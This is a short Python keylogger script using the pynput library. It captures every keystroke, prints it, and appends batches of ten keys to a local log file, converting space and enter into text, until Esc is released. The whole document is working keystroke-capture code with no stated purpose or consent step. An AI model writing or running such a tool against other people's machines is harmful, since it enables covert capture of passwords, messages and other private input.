import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    print(key, " was pressed")
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    file = open("keylog\log.txt", "a")
    for i in keys:
        k = str(i).replace("'","")
        if k == "Key.space":
            file.write(" ")
        elif k == "Key.enter":
            file.write("\n")
        else:
            file.write(k)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


